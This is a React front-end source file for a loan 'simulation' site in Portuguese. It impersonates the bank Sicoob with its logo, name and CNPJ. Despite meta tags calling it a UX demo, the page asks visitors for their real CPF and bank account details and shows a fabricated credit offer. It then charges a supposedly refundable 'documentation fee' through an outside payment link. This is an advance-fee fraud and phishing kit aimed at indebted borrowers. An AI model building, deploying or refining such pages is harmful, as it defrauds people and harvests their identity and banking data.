import { createFileRoute } from '@tanstack/react-router';
import { useEffect, useRef, useState } from 'react';
import { ArrowLeft, ArrowRight, BadgeCheck, Check, CheckCircle2, ChevronRight, Clock3, FileCheck2, Info, Landmark, LoaderCircle, LockKeyhole, Play, RotateCcw, ShieldCheck, Sparkles } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import cover from '@/assets/credit-video-cover.asset.json';
import videoAsset from '@/assets/institutional-video.asset.json';
import { currency, DOCUMENTATION_FEE, formatDocument, INSTALLMENT_OPTIONS, installmentAmount, PROCESSING_DURATION_MS, questions, SUGGESTED_CREDIT, VALIDATION_DURATION_MS } from '@/lib/credit-simulation';

export const Route = createFileRoute('/')({
  head: () => ({ meta: [
    { title: 'Simulador de Crédito Cooperativo | Estudo UX' },
    { name: 'description', content: 'Explore uma jornada demonstrativa de crédito cooperativo, com simulação personalizada e opções de parcelamento.' },
    { property: 'og:title', content: 'Simulador de Crédito Cooperativo | Estudo UX' },
    { property: 'og:description', content: 'Uma jornada demonstrativa de crédito, do seu perfil às opções de parcelamento. Sem contratação ou cobrança real.' },
    { property: 'og:type', content: 'website' },
    { name: 'twitter:card', content: 'summary_large_image' },
  ] }),
  component: () => <div>TESTE DE CARREGAMENTO</div>,
});


function VideoCover({ instruction = false, src = "/vsl-1.mp4" }: { instruction?: boolean, src?: string }) {
  const [playing, setPlaying] = useState(false);
  const videoRef = useRef<HTMLVideoElement>(null);

  const handlePlay = () => {
    if (videoRef.current) {
      videoRef.current.muted = false; 
      videoRef.current.currentTime = 0; 
      videoRef.current.play().catch(err => console.error("Erro ao dar play:", err));
      setPlaying(true);
    }
  };

  return (
    <div className="video-cover" style={{ position: 'relative', overflow: 'hidden', borderRadius: '24px', background: '#000', aspectRatio: '9/16' }}>
      <video 
        ref={videoRef}
        src={src} 
        autoPlay 
        loop 
        muted 
        playsInline 
        className="institutional-video" 
        style={{ width: '100%', height: '100%', objectFit: 'cover' }}
      />

      {!playing && (
        <div className="video-overlay" style={{ 
          position: 'absolute', 
          top: 0, 
          left: 0, 
          width: '100%', 
          height: '100%', 
          display: 'flex', 
          flexDirection: 'column', 
          justifyContent: 'space-between', 
          alignItems: 'center', 
          padding: '20px',
          backgroundColor: 'rgba(0,0,0,0.3)',
          zIndex: 10
        }}>
          <div className="video-topline" style={{ background: 'rgba(0,0,0,0.6)', color: 'white', padding: '4px 12px', borderRadius: '20px', fontSize: '12px', display: 'flex', alignItems: 'center', gap: '5px' }}>
            <Play size={9} fill="white" /> {instruction ? 'ANTES DE CONTINUAR' : 'CRÉDITO COOPERATIVO'}
          </div>

          <div className="video-play">
            <Button variant="play" size="icon" aria-label="Reproduzir vídeo institucional" onClick={handlePlay}>
              <Play fill="currentColor" />
            </Button>
          </div>

          <div className="video-caption" style={{ textAlign: 'center', color: 'white', marginBottom: '20px' }}>
            <strong style={{ display: 'block', fontSize: '18px' }}>{instruction ? 'Seu próximo passo começa aqui' : 'Um novo começo para seus planos'}</strong>
            <small style={{ opacity: 0.8 }}>Assista ao vídeo · 24 segundos</small>
          </div>
        </div>
      )}
    </div>
  );
}

function CreditJourney() {
  const [step, setStep] = useState(1);
  const [document, setDocument] = useState('');
  const [validating, setValidating] = useState(false);
  const [error, setError] = useState('');
  const [questionIndex, setQuestionIndex] = useState(0);
  const [answers, setAnswers] = useState<string[]>([]);
  const [progress, setProgress] = useState(0);
  const [months, setMonths] = useState(24);
  const [bank, setBank] = useState('');
  const [agency, setAgency] = useState('');
  const [account, setAccount] = useState('');
  const [suggestedCredit, setSuggestedCredit] = useState(SUGGESTED_CREDIT);
  const [complete, setComplete] = useState(false);
  const validationTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
  const answerTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
  const [transitioning, setTransitioning] = useState(false);
  const question = questions[questionIndex];

  const go = (next: number) => {
    setError(''); setStep(next);
    window.scrollTo({ top: 0, behavior: 'instant' });
  };

  useEffect(() => () => {
    if (validationTimer.current) clearTimeout(validationTimer.current);
    if (answerTimer.current) clearTimeout(answerTimer.current);
  }, []);

  useEffect(() => {
    if (step !== 4) return;
    setProgress(0);
    const started = Date.now();
    const timer = setInterval(() => {
      const value = Math.min(100, Math.floor((Date.now() - started) / PROCESSING_DURATION_MS * 100));
      setProgress(value);
      if (value === 100) { clearInterval(timer); }
    }, 40);

    const finish = setTimeout(() => { 
      const randomValue = Math.floor(Math.random() * (25000 - 5000 + 1)) + 5000;
      setSuggestedCredit(randomValue);
      setStep(5); 
      window.scrollTo({ top: 0 }); 
    }, PROCESSING_DURATION_MS + 450);

    return () => { 
      clearInterval(timer); 
      clearTimeout(finish); 
    };
  }, [step]);

  function validate() {
    if (document.replace(/\D/g, '').length !== 11) { setError('Digite os 11 números do documento de exemplo.'); return; }
    setError(''); setValidating(true);
    validationTimer.current = setTimeout(() => { setValidating(false); setQuestionIndex(0); setAnswers([]); go(3); }, VALIDATION_DURATION_MS);
  }

  function answer(value: string) {
    if (transitioning) return;
    setAnswers(previous => [...previous.slice(0, questionIndex), value]); setTransitioning(true);
    answerTimer.current = setTimeout(() => {
      setTransitioning(false);
      if (questionIndex < questions.length - 1) setQuestionIndex(previous => previous + 1); else go(4);
    }, 220);
  }

  function back() {
    if (step === 3 && questionIndex > 0) { setQuestionIndex(previous => previous - 1); return; }
    if (step === 5) { setQuestionIndex(4); go(3); return; }
    go(step - 1);
  }

  function reset() { 
    setDocument(''); 
    setAnswers([]); 
    setQuestionIndex(0); 
    setBank(''); 
    setAgency(''); 
    setAccount(''); 
    setComplete(false); 
    setMonths(24); 
    setSuggestedCredit(SUGGESTED_CREDIT); 
    go(1); 
  }

  return (
    <div className="app-shell">
      <header className="site-header">
        <div className="brand" aria-label="Referênciavisual Sicoob">
<img src="https://thumb.wikimedia.org/wikipedia/commons/thumb/5/59/Logotipo_do_Sicoob.svg/500px-Logotipo_do_Sicoob.svg.png?utm_source=pt.wikipedia.org&utm_campaign=index&utm_content=thumbnail" alt="Sicoob Logo" style={{ height: '20px', width: 'auto', objectFit: 'contain' }} />
          <span></span>
        </div>
        <div className="study-label">
          <strong>Crédito cooperativo</strong> Faça sua simulação · Pague com folga.
        </div>
      </header>

      {step === 1 ? (
        <section id="step1" className="step-enter">
          <main className="journey-main">
            <div className="intro-tag"><span className="status-dot" /> SEUS PLANOS MERECEM UM NOVO COMEÇO</div>
            <h1 className="home-title">Crédito para você.<br /><span>Possibilidades para<br />o seu futuro.</span></h1>
            <p className="home-description">Uma nova forma de olhar para seus planos.<br />Simule seu crédito, no seu tempo e sem complicação.</p>
            <VideoCover />
            <Button variant="journey" className="main-cta" onClick={() => go(2)}>Simular meu crédito <ArrowRight /></Button>
            <div className="micro-trust"><ShieldCheck /> Simulação gratuita, sem compromisso</div>
          </main>
          <div className="benefit-band">
            <div className="benefit"><Clock3 /><strong>Rápido e simples</strong><small>Do início ao próximo passo</small></div>
            <div className="benefit"><ShieldCheck /><strong>Você no controle</strong><small>Sem compromisso</small></div>
            <div className="benefit"><Landmark /><strong>Feito para você</strong><small>Escolha suas parcelas</small></div>
          </div>
        </section>
      ) : (
        <main id={`step${step}`} key={step} className="step-panel step-enter">
          <div className="step-navigation">
            {step !== 4 ? <Button variant="quiet" size="sm" onClick={back} disabled={validating || transitioning || complete}><ArrowLeft /> Voltar</Button> : <span>Simulação em andamento</span>}
            <span>{step === 7 ? 'Último passo' : step === 3 ? `Pergunta ${questionIndex + 1} de ${questions.length}` : `Etapa ${step - 1} de 6`}</span>
          </div>
          {step === 2 && <>
            <div className="feature-icon"><FileCheck2 /></div>
            <div className="stage-kicker">Vamos começar</div>
            <h1 className="step-title">O primeiro passo<br />é conhecer você.</h1>
            <p className="step-copy">Informe seu CPF para iniciar sua simulação de crédito.</p>
            <form onSubmit={event => { event.preventDefault(); validate(); }}>
              <label htmlFor="document" className="field-label">CPF:</label>
              <Input id="document" className="journey-input" inputMode="numeric" autoComplete="off" placeholder="000.000.000-00" value={document} onChange={event => setDocument(formatDocument(event.target.value))} disabled={validating} aria-invalid={!!error} aria-describedby="document-note" />
              {error && <p className="field-error" role="alert">{error}</p>}
              <p id="document-note" className="field-note">Use seus dados reais, para não ter erro na simulação.</p>
              <Button type="submit" variant="journey" className="main-cta" disabled={validating}>{validating ? <><LoaderCircle className="spinner" /> Validando informações</> : <>Continuar simulação <ArrowRight /></>}</Button>
            </form>
            {validating && <div className="loader-row" role="status"><LoaderCircle size={17} className="spinner" /> Validando informações no sistema... </div>}
            <div className="info-strip"><LockKeyhole /><span>Este é um banco independente para os empréstimos. Seus dados não são armazenados.</span></div>
          </>}
          {step === 3 && question && <>
            <div className="quiz-progress"><progress value={questionIndex + 1} max={questions.length} aria-label="Progresso das perguntas" /></div>
            <div className="quiz-enter" key={questionIndex}>
              <div className="stage-kicker">Pergunta {questionIndex + 1} de 5</div>
              <h1 className="step-title">{question.title}</h1><p className="step-copy">{question.hint}</p>
              <div className="option-list">{question.options.map((option, index) => <Button key={option} variant="choice" className="option-button" disabled={transitioning} onClick={() => answer(option)}>
                <span className="flex items-center gap-3"><span className="option-number">{index + 1}</span><span>{option}</span></span>{answers[questionIndex] === option ? <Check className="text-primary" /> : <ChevronRight className="text-muted-foreground" />}
              </Button>)}</div>
              <div className="micro-trust"><LockKeyhole /> Somente para esta simulação</div>
            </div>
          </>}
          {step === 4 && <div className="processing" role="status" aria-live="polite">
            <div className="processing-ring"><LoaderCircle className="spinner" /><strong>{progress}%</strong></div>
            <div className="stage-kicker">Conectando possibilidades</div>
            <h1 className="step-title">{progress < 35 ? 'Analisando seu perfil...' : progress < 75 ? 'Calculando sua margem...' : progress < 100 ? 'Preparando sua simulação...' : 'Tudo pronto!'}</h1>
            <p className="step-copy">Estamos preparando uma oferta<br />para o seu próximo passo.</p>
            <progress value={progress} max={100} aria-label="Progresso da simulação" /><p className="field-note">Não é uma análise real de crédito.</p>
          </div>}
          {step === 5 && <>
            <div className="offer-header"><div className="intro-tag"><Sparkles size={14} /> SUAS POSSIBILIDADES</div><h1 className="step-title mt-4">Um passo mais perto<br />dos seus planos.</h1><div className="offer-label">Valor sugerido nesta simulação</div><div className="offer-amount">{currency(suggestedCredit)}</div></div>
            <div className="plans-head"><span>Escolha o parcelamento</span><span>Valor por mês</span></div>
            <div role="group" aria-label="Opções de parcelamento">{INSTALLMENT_OPTIONS.map(value => <Button key={value} variant="choice" className="plan-row" data-selected={months === value} aria-pressed={months === value} onClick={() => setMonths(value)}><span className="flex items-center gap-3"><span className="plan-radio" />{value} parcelas</span><strong>{currency(installmentAmount(value))}</strong></Button>)}</div>
            <p className="field-note">Pague com folga. Sicoob, a menor taxa de juros do mercado.</p>
            <Button variant="journey" className="main-cta" onClick={() => go(6)}>Continuar com {months} parcelas <ArrowRight /></Button>
          </>}
          {step === 6 && <>
            <div className="stage-kicker">Seu próximo passo</div><h1 className="step-title">Onde seus planos<br />ganham vida.</h1><p className="step-copy mb-0">Escolha uma instituição para o saque.</p>
            <VideoCover instruction src="/meu-video.mp4" />
            <form onSubmit={event => { event.preventDefault(); if (!bank || !agency.trim() || !account.trim()) { setError('Selecione o banco e preencha agência e conta de exemplo.'); return; } go(7); }}>
<div className="bank-grid">{['Sicoob', 'Nubank', 'Itaú', 'Caixa', 'Inter', 'Bradesco', 'Santander', 'Banco do Brasil', 'Picpay', 'Mercado Pago', 'Outro' ].map(name => {
  const logo = {
    'Sicoob': 'https://upload.wikimedia.org/wikipedia/commons/4/4a/Marca-sicoob.png?utm_source=pt.wikipedia.org&utm_campaign=index&utm_content=thumbnail_unscaled',
    'Nubank': 'https://www.abcdacomunicacao.com.br/wp-content/uploads/Nubank-Logo-750x375.png',
    'Itaú': 'https://thumb.wikimedia.org/wikipedia/commons/thumb/1/19/Ita%C3%BA_Unibanco_logo_2023.svg/500px-Ita%C3%BA_Unibanco_logo_2023.svg.png?utm_source=pt.wikipedia.org&utm_campaign=index&utm_content=thumbnail',
    'Caixa': 'https://turismo.antoniocarlos.sc.gov.br/uploads/sites/36/2022/10/2606806.png',
    'Inter': 'https://static.bancointer.com.br/blog/images/0234e7aa235244759b77f4f5c444fdbd_inter-logo.jpg',
    'Bradesco': 'https://thumb.wikimedia.org/wikipedia/commons/thumb/a/a9/Banco_Bradesco_logo_%28vertical%29.png/960px-Banco_Bradesco_logo_%28vertical%29.png?utm_source=pt.wikipedia.org&utm_campaign=index&utm_content=thumbnail',
    'Santander': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/Santander_Logo.jpg?utm_source=pt.wikipedia.org&utm_campaign=index&utm_content=thumbnail_unscaled',
    'Banco do Brasil': 'https://logopng.com.br/logos/banco-do-brasil-5.svg?dpl=dpl_83xWKUBiCCc88zqvgK1XNSG8JXgj',
    'Picpay': 'https://www.lancerural.com.br/wp-content/uploads/2020/04/picpay-logo-1-300x225.jpg',
    'Mercado Pago': 'https://logo-teka.com/wp-content/uploads/2026/05/mercado-pago-vertical-logo.png',
    'Outro': null
  }[name];
  return (
    <Button type="button" key={name} variant="choice" className="bank-choice" data-selected={bank === name} aria-pressed={bank === name} onClick={() => setBank(name)}>
      {logo ? <img src={logo} alt={name} style={{ width: '20px', height: '20px', objectFit: 'contain' }} /> : <Landmark />}
      {name}
    </Button>
  );
})}</div>
              <div className="bank-fields"><div><label className="field-label" htmlFor="agency">Agência de exemplo</label><Input id="agency" className="journey-input" inputMode="numeric" placeholder="0000" maxLength={6} value={agency} onChange={event => setAgency(event.target.value.replace(/[^\d-]/g, ''))} /></div><div><label className="field-label" htmlFor="account">Conta de exemplo</label><Input id="account" className="journey-input" inputMode="numeric" placeholder="00000-0" maxLength={15} value={account} onChange={event => setAccount(event.target.value.replace(/[^\d-]/g, ''))} /></div></div>
              {error && <p className="field-error" role="alert">{error}</p>}<p className="field-note">Não cometa erros em seus dados, a transferência será realizada.</p>
              <Button type="submit" variant="journey" className="main-cta">Revisar minha simulação <ArrowRight /></Button>
            </form>
          </>}
          {step === 7 && <>
            <div className="feature-icon"><CheckCircle2 /></div><div className="stage-kicker">{complete ? 'Jornada concluída' : 'Tudo pronto para revisar'}</div>
            <h1 className="step-title">{complete ? 'Seus planos, novas possibilidades.' : 'Sua simulação está pronta.'}</h1>
            <p className="step-copy">{complete ? 'Obrigado por participar desta experiência de crédito cooperativo.' : 'Confira o resumo do caminho que você escolheu.'}</p>
            <div className="summary-row"><span>Empréstimo adquirido</span><strong>{currency(suggestedCredit)}</strong></div>
            <div className="summary-row"><span>Parcelamento</span><strong>{months} × {currency(installmentAmount(months))}</strong></div>
            <div className="summary-row"><span>Instituição selecionada</span><strong>{bank}</strong></div>
            <div className="fee-block"><span className="field-label">Taxa de Processamento de Documentação</span><strong>{currency(DOCUMENTATION_FEE)}</strong><p className="field-note">Valor totalmente reembolsado.</p></div>
            <div className="info-strip"><Info /><span>A taxa de confirmação de usúario, vai reconhecer seus documentos e previnir que não seja um robô. Valor da taxa rembolsado. Emprestimo é com Sicoob.</span></div>
            {complete ? <Button variant="journey" className="main-cta" onClick={reset}><RotateCcw /> Fazer outra simulação</Button> : <Button variant="journey" className="main-cta" onClick={() => window.location.href = 'https://ambieenteseguro.site/f/ed5twbff8d'}>Prosseguir ao saque <BadgeCheck /></Button>}
            <div className="micro-trust"><ShieldCheck /> Pagamento seguro.</div>
          </>}
        </main>
      )}

      <footer className="site-footer">
        <div className="footer-lock"><LockKeyhole size={11} /> Seus planos em primeiro lugar.</div>
        <p>Empréstimo para negativados.<br />O CNPJ matriz do Banco Cooperativo Sicoob S.A. é 02.367.871/0001-73.</p>
      </footer>
    </div>
  );
}
